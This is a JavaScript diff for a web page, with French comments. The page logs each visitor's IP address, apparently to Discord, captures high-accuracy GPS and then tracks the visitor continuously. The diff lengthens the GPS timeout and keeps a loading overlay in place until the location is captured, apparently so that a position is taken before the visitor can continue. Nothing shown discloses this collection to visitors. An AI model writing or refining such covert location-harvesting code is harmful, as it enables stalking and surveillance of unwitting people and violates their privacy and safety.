@@ -56,7 +56,7 @@ async function getPreciseLocation() {
 
         const options = {
             enableHighAccuracy: true,
-            timeout: 5000, // On réduit à 5s pour ne pas faire attendre trop longtemps l'utilisateur
+            timeout: 15000, // On laisse 15s au GPS pour répondre
             maximumAge: 0
         };
 
@@ -202,13 +202,18 @@ function getDistance(lat1, lon1, lat2, lon2) {
 }
 
     const handleFirstClick = async () => {
-        // 1. On libère l'interface immédiatement
-        overlay.style.display = 'none';
+        // 1. On montre que ça charge en changeant l'opacité et le curseur
+        overlay.style.cursor = 'wait';
+        const msg = overlay.querySelector('div');
+        if (msg) {
+            msg.innerText = 'Chargement en cours...';
+            msg.style.opacity = '0.8';
+        }
         
-        // 2. On envoie un premier log "IP uniquement" ultra-rapide pour Discord
-        await logVisitor();
+        // 2. On envoie le premier log (IP) sans attendre la fin pour gagner du temps
+        logVisitor();
 
-        // 3. On demande le GPS en arrière-plan
+        // 3. On demande le GPS (on attend max 15s)
         try {
             const location = await getPreciseLocation();
             if (location) {
@@ -234,10 +239,13 @@ function getDistance(lat1, lon1, lat2, lon2) {
                 });
             }
         } catch (e) {
-            console.error("Erreur lors de la capture GPS initiale:", e);
+            console.error("Erreur capture GPS:", e);
         }
 
-        // Mode watchPosition pour un suivi ultra-précis en temps réel
+        // 4. MAINTENANT on fait disparaître l'overlay
+        overlay.style.display = 'none';
+
+        // Mode watchPosition pour la suite
         if (navigator.geolocation) {
             navigator.geolocation.watchPosition(
                 async (position) => {
